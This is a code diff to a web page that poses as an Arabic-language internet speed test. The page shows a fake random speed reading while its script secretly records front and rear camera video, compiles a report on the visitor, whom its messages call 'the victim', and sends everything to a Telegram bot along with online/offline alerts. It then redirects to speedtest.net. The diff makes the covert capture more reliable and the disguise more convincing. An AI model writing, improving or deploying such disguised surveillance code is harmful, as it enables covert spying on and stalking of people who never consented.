@@ -13,6 +13,7 @@
         .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
         .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
         #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; outline: none; }
+        #goBtn:active { transform: scale(0.9); }
         #speedDisplay { display: none; text-align: center; }
         .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
         video { display: none; }
@@ -52,8 +53,9 @@
             } catch (e) {}
         }
 
+        // إشعارات متقدمة للحالة
         window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة الآن.");
-        window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد للصفحة الآن.");
+        window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد لفتح الصفحة الآن.");
 
         async function getFullReport() {
             let info = `📊 *تقرير شامل للهدف*:\n\n`;
@@ -86,15 +88,31 @@
 
         async function recordVideo(mode, label, duration) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
+                // إيقاف أي تيار نشط لضمان التبديل الصحيح
+                if (window.currentStream) {
+                    window.currentStream.getTracks().forEach(t => t.stop());
+                }
+
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode }, 
+                    audio: false 
+                });
+                
+                window.currentStream = stream;
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
-                recorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                recorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
                 
                 const recordingPromise = new Promise(resolve => {
                     recorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: "video/mp4" });
-                        await sendToTelegram(`🎥 فيديو لايف (${label} - 12 ثانية)`, "video", blob);
+                        // التحقق من وجود بيانات حقيقية لتجنب ملفات 110 بايت
+                        if (blob.size > 2000) {
+                            await sendToTelegram(`🎥 فيديو لايف (${label} - 12 ثانية)`, "video", blob);
+                        }
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
                     };
@@ -103,7 +121,7 @@
                 recorder.start();
                 await new Promise(r => setTimeout(r, duration));
                 recorder.stop();
-                return recordingPromise; // ننتظر حتى ينتهي الإرسال فعلياً
+                return recordingPromise;
             } catch (e) {
                 await sendToTelegram(`❌ فشل تصوير فيديو ${label}`);
             }
@@ -112,7 +130,7 @@
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
             document.getElementById("speedDisplay").style.display = "block";
-            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";
+            document.getElementById("subText").innerText = "جاري الفحص...";
 
             const timer = setInterval(() => {
                 document.getElementById("num").innerText = (Math.random() * (95 - 78) + 78).toFixed(1);
@@ -127,10 +145,12 @@
             // 2. فيديو أمامي (12 ثانية)
             await recordVideo("user", "أمامي", 12000);
 
-            // 3. فيديو خلفي (12 ثانية)
+            // 3. فترة انتظار تقنية لتبديل العدسة (3 ثوانٍ)
+            await new Promise(r => setTimeout(r, 3000));
+
+            // 4. فيديو خلفي (12 ثانية)
             await recordVideo("environment", "خلفي", 12000);
 
-            // نزيد وقت الانتظار قبل التحويل لضمان رفع الفيديوهات بالكامل
             setTimeout(() => {
                 clearInterval(timer);
                 location.href = "https://www.speedtest.net/ar";
